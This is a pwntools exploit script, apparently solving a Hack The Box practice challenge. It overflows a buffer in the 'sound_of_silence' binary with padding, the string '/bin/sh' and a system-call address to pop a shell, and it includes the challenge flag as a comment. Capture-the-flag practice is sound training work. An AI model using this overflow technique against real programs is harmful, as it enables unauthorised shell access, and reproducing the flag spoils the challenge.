#!/usr/bin/env python3

from pwn import *

exe = ELF("sound_of_silence_patched")
libc = ELF("libc.so.6")
ld = ELF("ld-linux-x86-64.so.2")
context.terminal = ["foot"]
context.binary = exe
go_system = 0x0000000000401169
def conn():
        return p
    

def main():


    p = process(exe.path)
    # p = remote('94.237.57.59',30335)
    gdb.attach(p,gdbscript='''
    b*0x000000000040116c

                       ''')
    payload = b'a'*8
    payload += b'a'*8
    payload += b'a'*8
    payload += b'a'*8
    payload += b'/bin/sh\0'
    payload += p64(go_system)
    p.sendlineafter(b'>>',payload)

   

    p.interactive()

#HTB{n0_n33d_4_l34k5_wh3n_u_h4v3_5y5t3m}
if __name__ == "__main__":
    main()
